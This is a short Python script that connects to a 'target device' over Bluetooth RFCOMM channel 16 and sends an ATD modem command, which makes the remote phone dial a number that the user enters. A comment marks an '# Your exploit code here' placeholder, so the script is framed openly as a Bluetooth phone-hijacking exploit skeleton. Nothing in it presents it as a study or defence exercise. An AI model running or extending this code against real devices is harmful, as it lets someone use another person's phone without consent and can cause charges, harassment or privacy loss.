import bluetooth

 

def connect_to_device(address):
    try:
        server_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        server_sock.connect((address, 16))
        print(f"Connected to {address}")
        return server_sock
    except Exception as e:
        print(f"Error connecting to {address}: {e}")
        return None

def make_call(address, phone_number):
    server_sock = connect_to_device(address)
    if server_sock is None:
        return

    # Your exploit code here
    print("Making a call")

    # Dial the phone number
    server_sock.send(f"ATD{phone_number}\r".encode())

    # Receive response
    response = server_sock.recv(1024)
    print(f"Received: {response.decode()}")

    server_sock.close()

def main():
 
    address = input("Enter the target device's address: ")
    phone_number = input("Enter the phone number: ")
    make_call(address, phone_number)

if __name__ == "__main__":
    main()